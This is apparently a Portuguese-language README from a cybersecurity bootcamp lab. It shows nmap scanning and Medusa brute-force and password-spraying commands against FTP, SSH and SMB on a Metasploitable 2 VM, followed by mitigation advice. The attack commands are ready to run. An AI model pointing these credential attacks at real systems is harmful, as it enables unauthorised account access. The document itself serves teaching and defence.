# 🛡️ Desafio de Cibersegurança: Ataques de Força Bruta com Medusa e Metasploitable

Este repositório documenta a resolução do desafio prático proposto no bootcamp de Cibersegurança da **DIO** em parceria com o **Santander**. O objetivo é simular ataques de força bruta em um ambiente controlado utilizando a ferramenta **Medusa** (no Kali Linux) contra uma máquina vulnerável (**Metasploitable 2**), compreendendo o funcionamento da técnica e como mitigá-la.

---

## ⚠️ Aviso Legal (Disclaimer)
Este projeto foi desenvolvido **exclusivamente para fins educacionais** em um ambiente virtual isolado. O uso das técnicas e ferramentas aqui descritas contra sistemas sem autorização prévia é ilegal e antiético.

---

## 🛠️ Ambiente e Ferramentas Utilizadas
* **Máquina Atacante:** Kali Linux
* **Máquina Alvo:** Metasploitable 2
* **Rede:** Modo Host-Only / Rede Interna (VirtualBox / VMware)
* **Ferramenta Principal:** Medusa (ferramenta de auditoria de senhas paralela e modular)
* **Wordlists:** `rockyou.txt` e listas personalizadas de usuários/senhas

---

## 🔍 1. Reconhecimento e Enumeração
Antes de iniciar o ataque, foi necessário identificar o endereço IP do alvo e os serviços ativos na rede.

1. **Descoberta de IP (na máquina Metasploitable):**
   ```bash
   ifconfig
   ```
   *(Exemplo de IP encontrado: `192.168.56.101`)*

2. **Varredura de Portas e Serviços (no Kali Linux):**
   ```bash
   nmap -sV -Pn 192.168.56.101
   ```
   **Principais serviços identificados:**
   * **Porta 21 (FTP):** vsftpd 2.3.4
   * **Porta 22 (SSH):** OpenSSH 4.7p1
   * **Porta 23 (Telnet):** Linux telnetd
   * **Porta 445 (SMB):** Samba smbd 3.X

---

## 🚀 2. Execução dos Ataques com Medusa

### Cenário A: Ataque de Força Bruta no Serviço FTP (Porta 21)
Para testar a robustez das credenciais FTP, utilizamos listas de usuários e senhas personalizadas.

```bash
medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M ftp -t 4
```
* `-h`: Endereço IP do alvo.
* `-U`: Arquivo contendo a lista de nomes de usuários.
* `-P`: Arquivo contendo a lista de senhas (wordlist).
* `-M`: Módulo do serviço a ser atacado (`ftp`).
* `-t`: Número de threads simultâneas.

**Resultado:** Credenciais válidas encontradas (`msfadmin:msfadmin` / `user:user`).

---

### Cenário B: Ataque de Força Bruta no Serviço SSH (Porta 22)
Realizamos o teste direcionado a um usuário específico (`msfadmin`) utilizando uma wordlist maior.

```bash
medusa -h 192.168.56.101 -u msfadmin -P /usr/share/wordlists/rockyou.txt -M ssh -f
```
* `-u`: Usuário único conhecido.
* `-f`: Interrompe o ataque assim que a primeira senha válida for encontrada.

---

### Cenário C: Password Spraying em SMB (Porta 445)
Testando uma única senha comum contra vários usuários para evitar bloqueios de conta.

```bash
medusa -h 192.168.56.101 -U users.txt -p 123456 -M smbnt
```
* `-p`: Senha única testada contra toda a lista de usuários.

---

## 🛡️ 3. Medidas de Mitigação e Defesa
Para proteger sistemas reais contra os ataques demonstrados neste laboratório, recomenda-se:

* **Política de Senhas Fortes:** Exigir senhas complexas (letras maiúsculas, minúsculas, números e símbolos) com no mínimo 12 caracteres.
* **Bloqueio de Conta (Account Lockout):** Configurar o sistema para bloquear temporariamente o acesso após um número limite de tentativas falhas (ex: 3 a 5 tentativas).
* **Uso de Ferramentas de Prevenção (IPS):** Implementar soluções como o **Fail2Ban**, que monitora logs de autenticação e bloqueia automaticamente IPs suspeitos via firewall.
* **Autenticação Multifator (MFA):** Adicionar uma segunda camada de verificação além da senha.
* **Desabilitar Protocolos Inseguros:** Substituir serviços em texto claro (como Telnet e FTP) por alternativas criptografadas (SSH e SFTP) e desativar o login direto como `root`.

---

## 📚 Conclusão
A prática permitiu visualizar na prática como credenciais fracas ou padrão expõem serviços críticos na rede. O uso do Medusa demonstrou a velocidade com que ataques automatizados ocorrem, reforçando a importância de aplicar camadas de defesa e monitoramento contínuo.

